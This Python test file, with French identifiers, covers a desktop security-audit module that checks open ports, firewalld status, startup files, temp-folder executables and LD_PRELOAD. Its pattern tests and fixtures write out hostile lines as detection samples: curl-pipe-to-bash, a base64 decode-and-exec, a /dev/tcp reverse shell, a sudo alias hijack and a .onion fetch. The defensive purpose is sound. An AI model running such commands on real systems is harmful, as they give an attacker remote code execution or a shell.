import contextlib
import io
import os
import stat
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from centre_bazzite import securite

ECH = Path(__file__).parent / "echantillons"


def texte():
    return (ECH / "ss-tulpn.txt").read_text(encoding="utf-8")


def faux_run(reponses, appels=None):
    def run(cmd, timeout=120, entree=None):
        if appels is not None:
            appels.append((list(cmd), timeout))
        return reponses[tuple(cmd)]
    return run


class Ports(unittest.TestCase):
    def test_lire_ss_formats(self):
        e = securite.lire_ss(texte())
        self.assertEqual(len(e), 14)
        v6 = next(x for x in e if x["hote"] == "::" and x["port"] == 5353)
        self.assertEqual((v6["proto"], v6["prog"]), ("udp", "firefox"))
        ipv6 = next(x for x in e if x["port"] == 546)
        self.assertEqual(ipv6["hote"], "fe80::1234")
        self.assertEqual(next(x for x in e if x["port"] == 27036)["hote"], "*")
        self.assertIsNone(next(x for x in e if x["port"] == 5355)["prog"])
        self.assertEqual(next(x for x in e if x["port"] == 1716)["proto"], "tcp")
        self.assertEqual(securite.lire_ss("n'importe quoi\n\ntcp LISTEN 0 0 x y\n"), [])

    def test_ports_classes(self):
        p = securite.ports(texte())
        self.assertEqual(p["inconnus"], [{"prog": "serveur-dev", "ports": [3000, 3001]}])
        noms = [x["prog"] for x in p["inconnus"] + p["connus"]]
        self.assertNotIn("serveur-local", noms)
        self.assertNotIn("steamwebhelper", noms)
        self.assertIn("jeu-reseau", [x["prog"] for x in p["connus"]])
        # l'UDP d'un programme inconnu va chez les connus ; [::]:5353 est exposé et rangé selon son programme
        self.assertIn({"prog": "serveur-dev", "ports": [5000]}, p["connus"])
        self.assertIn({"prog": "firefox", "ports": [5353]}, p["connus"])
        self.assertEqual(p["systeme"], [546, 5355, 7777])

    def test_serveurs_connus_de_la_config(self):
        self.assertEqual(securite.ports(texte(), ["serveur-dev"])["inconnus"], [])


class PareFeu(unittest.TestCase):
    def test_pare_feu_actif(self):
        run = faux_run({
            ("firewall-cmd", "--state"): (0, "running"),
            ("firewall-cmd", "--get-default-zone"): (0, "FedoraWorkstation\n"),
            ("firewall-cmd", "--list-ports"): (0, "1025-65535/udp 1025-65535/tcp\n"),
            ("firewall-cmd", "--list-services"): (0, "dhcpv6-client samba-client ssh\n"),
        })
        r = securite.pare_feu(run)
        self.assertTrue(r["actif"])
        self.assertEqual(r["zone"], "FedoraWorkstation")
        self.assertTrue(r["ouvre_hauts"])
        self.assertEqual(r["services"], ["dhcpv6-client", "samba-client", "ssh"])

    def test_pare_feu_arrete(self):
        appels = []
        r = securite.pare_feu(faux_run({("firewall-cmd", "--state"): (252, "not running")}, appels))
        self.assertFalse(r["actif"])
        self.assertEqual(len(appels), 1)

    def test_pare_feu_replis(self):
        appels = []
        r = securite.pare_feu(faux_run({
            ("firewall-cmd", "--state"): (-1, "No such file"),
            ("systemctl", "is-active", "firewalld"): (0, "active\n"),
        }, appels))
        self.assertTrue(r["actif"])
        self.assertIsNone(r["zone"])
        self.assertEqual(appels[0], (["firewall-cmd", "--state"], 3))
        self.assertIsNone(securite.pare_feu(faux_run({
            ("firewall-cmd", "--state"): (-1, "No such file"),
            ("systemctl", "is-active", "firewalld"): (-1, "boom"),
        })))
        self.assertIsNone(securite.pare_feu(faux_run({
            ("firewall-cmd", "--state"): (-1, "x"),
            ("systemctl", "is-active", "firewalld"): (4, ""),
        })))
        self.assertFalse(securite.pare_feu(faux_run({
            ("firewall-cmd", "--state"): (-1, "x"),
            ("systemctl", "is-active", "firewalld"): (3, "inactive\n"),
        }))["actif"])

    def test_pare_feu_par_code_de_sortie(self):
        sc = ("systemctl", "is-active", "firewalld")
        r = securite.pare_feu(faux_run({("firewall-cmd", "--state"): (36, "Error: DBUS_ERROR"), sc: (0, "active")}))
        self.assertTrue(r["actif"])
        self.assertIsNone(securite.pare_feu(faux_run({("firewall-cmd", "--state"): (36, "Error: DBUS_ERROR"),
                                                      sc: (4, "")})))
        self.assertIsNone(securite.pare_feu(faux_run({("firewall-cmd", "--state"): (36, "Error: DBUS_ERROR"),
                                                      sc: (4, "inactive")})))
        zone = {("firewall-cmd", "--get-default-zone"): (0, "public\n"),
                ("firewall-cmd", "--list-ports"): (0, ""), ("firewall-cmd", "--list-services"): (0, "ssh\n")}
        r = securite.pare_feu(faux_run({("firewall-cmd", "--state"): (0, "running\nWaiting on dbus connection..."),
                                        **zone}))
        self.assertTrue(r["actif"])
        self.assertEqual(r["zone"], "public")
        appels = []
        r = securite.pare_feu(faux_run({("firewall-cmd", "--state"): (252, "not running")}, appels))
        self.assertFalse(r["actif"])
        self.assertEqual([c[0][0] for c in appels], ["firewall-cmd"])


class Arbre(unittest.TestCase):
    def setUp(self):
        t = tempfile.TemporaryDirectory()
        self.addCleanup(t.cleanup)
        self.racine = Path(t.name)
        self.home, self.etc, self.tmp = (self.racine / n for n in ("home", "etc", "tmp"))
        for d in (self.home, self.etc, self.tmp):
            d.mkdir()

    def ecrire(self, chemin, contenu="", mode=None):
        chemin = Path(chemin)
        chemin.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(contenu, bytes):
            chemin.write_bytes(contenu)
        else:
            chemin.write_text(contenu, encoding="utf-8")
        if mode is not None:
            chemin.chmod(mode)
        return chemin

    def sans_droits(self, chemin):
        """chmod 0, rétabli au nettoyage pour que le dossier temporaire puisse être supprimé."""
        chemin = Path(chemin)
        ancien = stat.S_IMODE(chemin.stat().st_mode)
        chemin.chmod(0)
        self.addCleanup(chemin.chmod, ancien)


ELF = b"\x7fELF" + b"\x00" * 20


class Motifs(unittest.TestCase):
    def test_motifs(self):
        cas = [
            ("curl -fsSL https://exemple.test/x.sh | bash", "echec", "télécharge et exécute un script"),
            ("echo aGk= | base64 -d | sh", "echec", "décode et exécute un contenu caché (base64)"),
            ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "echec", "ouvre un accès à distance (shell inversé)"),
            ("alias sudo='/opt/x/faux-sudo'", "echec", "remplace sudo/su par autre chose"),
            ("export LD_PRELOAD=/opt/x.so", "attention",
             "précharge une bibliothèque dans tous les programmes (LD_PRELOAD)"),
            ("Exec=/tmp/outil --go", "attention", "lance quelque chose depuis un dossier temporaire"),
            ("wget abcdefghij234567.onion", "attention", "contacte une adresse du réseau Tor (.onion)"),
        ]
        for ligne, gravite, quoi in cas:
            r = securite.chercher("echo ok\n" + ligne + "\n")
            self.assertEqual((r["gravite"], r["quoi"], r["numero"]), (gravite, quoi, 2), ligne)
        for ligne in ("Exec=/tmp/.mount_abc/AppRun", "# curl x | sh", "Exec=/usr/bin/steam -silent", ""):
            self.assertIsNone(securite.chercher(ligne), ligne)
        self.assertIsNone(securite.chercher("alias sudo='sudo '"))
        self.assertEqual(securite.chercher("alias sudo='/tmp/x'")["gravite"], "echec")
        long = securite.chercher("curl " + "a" * 400 + " | sh")
        self.assertEqual(len(long["ligne"]), 200)

    def test_premier_motif_dans_l_ordre(self):
        r = securite.chercher("export LD_PRELOAD=/opt/x.so\ncurl x | sh\n")
        self.assertEqual((r["gravite"], r["numero"]), ("echec", 2))


class Demarrage(Arbre):
    def test_fichiers_demarrage(self):
        self.ecrire(self.home / ".bashrc")
        self.ecrire(self.home / ".config/fish/config.fish")
        self.ecrire(self.home / ".config/fish/conf.d/a.fish")
        self.ecrire(self.home / ".config/fish/functions/f.fish")
        self.ecrire(self.home / ".config/plasma-workspace/env/p.sh")
        self.ecrire(self.etc / "profile.d/a.sh")
        self.ecrire(self.etc / "systemd/system/s.service")
        auto = self.ecrire(self.racine / "autostart/o.desktop")
        unite = self.ecrire(self.racine / "unites/u.service")
        usr = self.ecrire(self.racine / "usr/share/applications/x.desktop")
        usr_chemin = Path("/usr/share/applications/x.desktop")
        r = securite.fichiers_demarrage(self.home, self.etc, [auto, usr_chemin], [unite])
        roles = {f: role for f, role in r}
        self.assertNotIn(usr_chemin, roles)
        self.assertEqual(roles[self.home / ".bashrc"], "script du shell")
        self.assertEqual(roles[self.home / ".config/fish/config.fish"], "configuration de fish")
        self.assertEqual(roles[self.home / ".config/fish/conf.d/a.fish"], "configuration de fish")
        self.assertEqual(roles[self.home / ".config/fish/functions/f.fish"], "fonction fish")
        self.assertEqual(roles[self.home / ".config/plasma-workspace/env/p.sh"], "script de session Plasma")
        self.assertEqual(roles[self.etc / "profile.d/a.sh"], "profil du shell (système)")
        self.assertEqual(roles[self.etc / "systemd/system/s.service"], "service systemd système")
        self.assertEqual(roles[auto], "démarrage automatique")
        self.assertEqual(roles[unite], "service systemd personnel")
        self.assertEqual(len(r), 9)

    def test_unites_systemd_personnelles_lues_en_direct(self):
        s = self.ecrire(self.home / ".config/systemd/user/x.service")
        m = self.ecrire(self.home / ".config/systemd/user/x.timer")
        roles = dict(securite.fichiers_demarrage(self.home, self.etc, [], []))
        self.assertEqual((roles[s], roles[m]), (securite.ROLE_UNITE_DIRECTE,) * 2)
        r = securite.fichiers_demarrage(self.home, self.etc, [], [s])
        self.assertEqual([f for f, _ in r].count(s), 1)
        self.assertEqual(len(r), 2)
        # celle que la page Démarrage liste (passée en `unites`) garde le rôle de la page
        self.assertEqual(dict(r)[s], "service systemd personnel")
        self.assertEqual(dict(r)[m], securite.ROLE_UNITE_DIRECTE)

    def test_demarrage_suit_les_liens_de_dotfiles(self):
        piege = self.ecrire(self.racine / "dotfiles/bashrc", "curl x | bash\n")
        lien = self.home / ".bashrc"
        lien.symlink_to(piege)
        r = securite.demarrage_suspect(securite.fichiers_demarrage(self.home, self.etc, [], []))
        self.assertEqual([t["chemin"] for t in r["trouves"]], [str(lien)])

    def test_demarrage_fifo_non_lu(self):
        os.mkfifo(self.home / ".profile")
        self.assertEqual(securite.demarrage_suspect([(self.home / ".profile", "x")])["lus"], 0)

    def test_demarrage_suspect(self):
        bashrc = self.ecrire(self.home / ".bashrc", "# a\nalias ll='ls -l'\ncurl https://exemple.test/x.sh | bash\n")
        propre = self.ecrire(self.home / ".profile", "export A=1\n")
        r = securite.demarrage_suspect([(bashrc, "script du shell"), (propre, "script du shell")])
        self.assertEqual(r["lus"], 2)
        self.assertFalse(r["incomplet"])
        self.assertEqual(len(r["trouves"]), 1)
        t = r["trouves"][0]
        self.assertEqual((t["numero"], t["gravite"], t["chemin"], t["role"]), (3, "echec", str(bashrc), "script du shell"))
        self.assertTrue(securite.demarrage_suspect([], incomplet=True)["incomplet"])

    def test_demarrage_fichiers_illisibles(self):
        binaire = self.ecrire(self.home / "binaire", bytes(range(256)) * 4)
        latin = self.ecrire(self.home / "latin", b"caf\xe9 \xff\xfe\n")
        gros = self.ecrire(self.home / "gros", b"a" * (2 * 2**20 - 30) + b"\ncurl x | bash\n" + b"b" * 30)
        verrou = self.ecrire(self.home / "verrou", "curl x | bash\n")
        self.sans_droits(verrou)
        absent = self.home / "absent"
        fichiers = [(f, "script du shell") for f in (binaire, latin, gros, verrou, absent)]
        r = securite.demarrage_suspect(fichiers)
        self.assertEqual(r["lus"], 3)
        # le gros fichier n'est lu que sur 1 Mio : la ligne piégée, au-delà, n'est pas vue
        self.assertEqual(r["trouves"], [])

    def test_ld_preload(self):
        self.assertEqual(securite.ld_preload(self.etc / "ld.so.preload"), [])
        f = self.ecrire(self.etc / "ld.so.preload", "/lib/x.so\n\n")
        self.assertEqual(securite.ld_preload(f), ["/lib/x.so"])

    def test_ld_preload_illisible_leve(self):
        f = self.ecrire(self.etc / "ld.so.preload", "/lib/x.so\n")
        self.sans_droits(f)
        with self.assertRaises(OSError):
            securite.ld_preload(f)


class Temporaires(Arbre):
    def test_temporaires(self):
        bon = self.ecrire(self.tmp / "a/bon", ELF, 0o755)
        self.ecrire(self.tmp / "script", "#!/bin/sh\n", 0o755)
        self.ecrire(self.tmp / "non-exec", ELF, 0o644)
        self.ecrire(self.tmp / ".mount_x/appli", ELF, 0o755)
        self.ecrire(self.tmp / "jeux/serveur", ELF, 0o755)
        r = securite.temporaires([self.tmp], ignores=[self.tmp / "jeux"])
        self.assertEqual(r["nombre"], 1)
        self.assertEqual(r["exemples"], [str(bon)])
        self.assertFalse(r["plafond_atteint"])
        self.assertGreaterEqual(r["examines"], 3)

    def test_temporaires_dossiers_hostiles(self):
        self.ecrire(self.tmp / "ok/bon", ELF, 0o755)
        interdit = self.tmp / "interdit"
        self.ecrire(interdit / "x", ELF, 0o755)
        self.sans_droits(interdit)
        (self.tmp / "boucle").symlink_to(self.tmp)
        os.mkfifo(self.tmp / "tube")
        r = securite.temporaires([self.tmp, self.tmp / "absent"])
        self.assertEqual(r["nombre"], 1)
        for i in range(5):
            self.ecrire(self.racine / f"p/f{i}", "x")
        r = securite.temporaires([self.racine / "p"], plafond=3)
        self.assertTrue(r["plafond_atteint"])

    def test_temporaires_plafond_compte_les_dossiers(self):
        for i in range(5):
            (self.racine / f"d{i}").mkdir()
        self.assertTrue(securite.temporaires([self.racine], plafond=3)["plafond_atteint"])

    def test_temporaires_lien_vers_elf_non_compte(self):
        cible = self.ecrire(self.racine / "hors/bon", ELF, 0o755)
        (self.tmp / "lien").symlink_to(cible)
        self.assertEqual(securite.temporaires([self.tmp])["nombre"], 0)

    def test_temporaires_ne_rafraichit_pas_les_atime(self):
        """Lire un fichier ou un dossier rafraîchirait son atime (relatime) : systemd-tmpfiles ne le nettoierait plus."""
        elf = self.ecrire(self.tmp / "d/bon", ELF, 0o755)
        dossier = elf.parent
        vieux = __import__("time").time() - 2 * 86400
        for chemin in (elf, dossier):
            os.utime(chemin, (vieux, os.stat(chemin).st_mtime))
        avant = {c: os.stat(c).st_atime for c in (elf, dossier)}
        self.assertEqual(securite.temporaires([self.tmp])["nombre"], 1)
        self.assertEqual({c: os.stat(c).st_atime for c in (elf, dossier)}, avant)

    def test_ouvrir_sans_atime_repli_si_pas_proprietaire(self):
        appels = []

        def faux_open(chemin, drapeaux):
            appels.append(drapeaux)
            if drapeaux & os.O_NOATIME:
                raise PermissionError
            return 42
        with mock.patch.object(securite.os, "open", faux_open):
            self.assertEqual(securite._ouvrir_sans_atime("x", os.O_RDONLY), 42)
        self.assertEqual([bool(d & os.O_NOATIME) for d in appels], [True, False])

    def test_fichiers_reste_sur_le_systeme_de_fichiers_de_la_racine(self):
        self.ecrire(self.tmp / "ici/a", "x")
        self.ecrire(self.tmp / "monte/b", "x")

        def lstat(chemin):
            st = os.lstat(chemin)
            if str(chemin) == str(self.tmp / "monte"):
                return os.stat_result(st[:2] + (st.st_dev + 1,) + st[3:])
            return st
        vus = {os.path.relpath(c, self.tmp) for c, _ in securite._fichiers(self.tmp, lstat=lstat)}
        self.assertIn("monte", vus)
        self.assertNotIn("monte/b", vus)
        self.assertIn("ici/a", vus)

    def test_socket_process_est_un_programme_connu(self):
        self.assertIn("Socket Process", securite.PROGRAMMES_CONNUS)

    def test_executables_cache_plafond(self):
        for i in range(4):
            self.ecrire(self.home / f".cache/d{i}/x", "x", 0o755)
        self.assertEqual(sum(d["nombre"] for d in securite.executables_cache(self.home / ".cache")), 4)
        with mock.patch.object(securite, "PLAFOND_FICHIERS", 3):    # 3 entrées examinées, dossiers compris
            self.assertLess(sum(d["nombre"] for d in securite.executables_cache(self.home / ".cache")), 4)

    def test_chemin_ignore_egal_a_une_racine(self):
        self.ecrire(self.tmp / "a/bon", ELF, 0o755)
        racine2 = self.ecrire(self.racine / "t2/x", ELF, 0o755).parent
        r = securite.temporaires([self.tmp, racine2], ignores=[self.tmp])
        self.assertEqual(r["exemples"], [str(racine2 / "x")])

    def test_executables_cache(self):
        for i in range(3):
            self.ecrire(self.home / f".cache/uv/f{i}", "x", 0o755)
        self.ecrire(self.home / ".cache/autre/g", "x", 0o755)
        self.ecrire(self.home / ".cache/autre/h", "x", 0o644)
        self.assertEqual(securite.executables_cache(self.home / ".cache"),
                         [{"dossier": "uv", "nombre": 3}, {"dossier": "autre", "nombre": 1}])
        self.assertEqual(securite.executables_cache(self.home / ".cache/absent"), [])


class Collecte(Arbre):
    def test_collecter_isole_chaque_mesure(self):
        def run(cmd, timeout=120, entree=None):
            if cmd[0] == "ss":
                raise RuntimeError("ss en panne")
            return -1, "absent"
        self.ecrire(self.home / ".bashrc", "curl x | bash\n")
        self.ecrire(self.tmp / "bon", ELF, 0o755)
        err = io.StringIO()
        with contextlib.redirect_stderr(err), mock.patch.object(securite.demarrage, "fichiers_autostart",
                                                                 return_value=[]), \
                mock.patch.object(securite.config, "securite",
                                  return_value={"temporaires_ignores": [], "serveurs_connus": []}):
            r = securite.collecter(run=run, home=self.home, etc=self.etc, racines_temporaires=[self.tmp],
                                   preload=self.etc / "ld.so.preload")
        self.assertEqual(set(r), {"pare_feu", "ports", "demarrage", "ld_preload", "temporaires", "cache"})
        self.assertIsNone(r["ports"])
        self.assertIn("ports", err.getvalue())
        self.assertIsNone(r["pare_feu"])
        self.assertTrue(r["demarrage"]["incomplet"])
        self.assertEqual(r["demarrage"]["trouves"][0]["gravite"], "echec")
        self.assertEqual(r["ld_preload"], [])
        self.assertEqual(r["temporaires"]["nombre"], 1)
        self.assertEqual(r["cache"], [])

    def test_collecter_ports_depuis_ss(self):
        appels = []
        run = faux_run({("ss", "-tulpnH"): (0, texte())}, appels)

        def tout(cmd, timeout=120, entree=None):
            return run(cmd, timeout) if cmd[0] == "ss" else (-1, "x")
        with mock.patch.object(securite.demarrage, "fichiers_autostart", return_value=[]), \
                mock.patch.object(securite.config, "securite",
                                  return_value={"temporaires_ignores": [], "serveurs_connus": ["serveur-dev"]}):
            r = securite.collecter(run=tout, home=self.home, etc=self.etc, racines_temporaires=[self.tmp],
                                   preload=self.etc / "ld.so.preload")
        self.assertEqual(r["ports"], securite.ports(texte(), ["serveur-dev"]))
        self.assertEqual(appels[0][0], ["ss", "-tulpnH"])

    def test_collecter_lit_la_config_une_fois(self):
        with mock.patch.object(securite.demarrage, "fichiers_autostart", return_value=[]), \
                mock.patch.object(securite.config, "securite",
                                  return_value={"temporaires_ignores": [], "serveurs_connus": []}) as c:
            securite.collecter(run=lambda cmd, timeout=120, entree=None: (0, ""), home=self.home, etc=self.etc,
                               racines_temporaires=[self.tmp], preload=self.etc / "ld.so.preload")
        self.assertEqual(c.call_count, 1)

if __name__ == "__main__":
    unittest.main()
